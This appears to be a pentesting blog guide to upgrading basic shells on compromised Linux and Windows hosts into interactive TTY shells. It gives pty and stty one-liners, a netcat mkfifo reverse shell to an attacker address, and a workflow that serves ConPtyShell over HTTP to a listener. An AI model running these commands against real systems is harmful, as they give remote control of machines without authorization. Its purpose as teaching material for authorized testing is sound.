---
title: "Upgrading an Autocomplete TTY Shell on Linux and Windows: A Guide for Pentesters"
date: 2024-11-06 10:10:00 +0700
categories: [Other]
tags: [Other, tty-shell, autocomplete]
pin: false
---

## Upgrading an Autocomplete TTY Shell on Linux and Windows: A Guide for Pentesters

### Introduction

When working with command-line interfaces on compromised machines, it is common to be limited to basic TTY shells that lack essential features like autocomplete and history. Upgrading these shells can significantly improve usability and efficiency during post-exploitation. This guide covers methods to upgrade TTY shells on both Linux and Windows targets to provide functionalities such as command history and tab completion, making them easier to work with.

### Verify Installed Language(s)

Before attempting to upgrade or interact with shells, it's important to verify which interpreters and shells are available on the target system. This helps determine the best approach to proceed. Here's how to check which interpreters or shells are installed:

```shell
# Check if Python is installed and its location
which python    # Output will show the path if Python 2.x is installed

# Check for Python 3 installation
which python3   # Output will show the path if Python 3.x is installed

# Verify if Bash is available
which bash      # Output will show the path if Bash is installed

# Check for PowerShell on a Linux machine (if applicable)
which pwsh      # This shows if PowerShell Core is available on Linux

# For Windows, check in Command Prompt or PowerShell for presence
where python    # Equivalent to 'which' in Windows
where python3
where bash
```

### Examples

Below are commands to help upgrade the basic TTY shell:

```bash
# Use Python 3 to spawn an upgraded shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Use Python 2 to spawn an upgraded shell
python -c 'import pty; pty.spawn("/bin/bash")'

# Alternative approach with os.system
echo os.system('/bin/bash')

# Spawn an interactive shell with /bin/sh
/bin/sh -i

# Use Perl to execute a shell
perl -e 'exec "/bin/sh";'

# Use Ruby to execute a shell
ruby -e 'exec "/bin/sh"'
```

### If Python Isn't Installed, Use:

```shell
# Use the script command to spawn an upgraded shell
script /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Reverse Shell Example

```bash
# Simple reverse shell using Netcat
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.xxx.xxx 9001 >/tmp/f
```

### Steps to Get an Autocomplete Shell

1. After choosing one of the methods above to upgrade your TTY shell, suspend it using:

    ```bash
    ctrl-z
    ```

2. On the attacker's machine, run:

    ```bash
    stty raw -echo
    stty -a  # Verify current terminal settings
    ```

3. Bring the shell to the foreground:

    ```bash
    fg
    ```

4. Press `Enter` twice to reactivate the session.

Now you should have a shell with autocomplete, history, and better usability features.

To have autocomplete on a Windows machine, you can also use:

- <a href="https://github.com/antonioCoco/ConPtyShell" target="_blank">ConPtyShell</a>

## A simple guide how you could use it:

To upgrade to an advanced shell on a Windows target using PowerShell, you can leverage the ConPtyShell method. Below is an example workflow for hosting and running the script:

On Kali Linux (Attacker's Machine)
```bash
# Host the PowerShell script
python3 -m http.server 80  
# to host Invoke-ConPtyShell.ps1

# In another terminal on Kali
stty raw -echo; (stty size; cat) | nc -lvnp 9001
```

To have autocomplete on a Linux machine, you can also use:

- <a href="https://github.com/brightio/penelope" target="_blank">penelope</a>
```shell
# Clone the repo, go to the directory and use the command:
./penelope.py 5555 -i eth0

# For more guidance, go to the repo.
```
